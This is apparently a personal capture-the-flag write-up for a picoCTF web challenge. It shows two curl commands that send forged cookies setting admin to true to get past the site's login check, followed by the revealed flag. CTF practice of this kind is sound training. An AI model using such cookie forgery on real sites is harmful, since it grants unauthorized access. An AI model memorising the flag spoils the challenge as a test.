#### Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

![[Pasted image 20250325105221.png]]marcorojas@MarcoRojas:~$ curl -s https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=juan; password=juan; admin=true" |grep pico
marcorojas@MarcoRojas:~$ curl -s https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=juan; password=juan; admin=True" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
marcorojas@MarcoRojas:~$

